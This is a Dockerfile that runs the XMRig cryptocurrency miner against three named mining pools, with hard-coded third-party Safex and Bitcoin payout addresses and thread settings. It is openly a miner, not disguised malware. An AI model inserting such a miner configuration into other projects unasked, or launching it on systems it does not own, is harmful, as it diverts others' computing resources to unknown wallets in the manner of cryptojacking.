FROM miningcontainers/xmrig:latest

ENTRYPOINT ["./xmrig"]
CMD ["--url=fastpool.xyz:3036", "--user=Safex5zyhq5F8gL8QDLaM7R8uEHVcFyv13DvKUrLeUAU32cVzecCJ7XFGsKwHaNm6MJbf4fVsLF7jH37KQtDKP39XdRn1YM3S2Q2W@AWspt", "--algo=randomSFX", "--pass=x", "-t=4", "--url=web.letshash.it:5219", "--user=Safex5zyhq5F8gL8QDLaM7R8uEHVcFyv13DvKUrLeUAU32cVzecCJ7XFGsKwHaNm6MJbf4fVsLF7jH37KQtDKP39XdRn1YM3S2Q2W", "--algo=randomSFX", "--pass=AWspt", "-t=8", "--url=stratum+tcp://randomxmonero.auto.nicehash.com:9200", "--user=3JSGZn212KjkjDNYYDK7xskSnMQ5oGR7NK.AWspt", "--algo=rx", "--pass=x", "-k", "-t=4"]
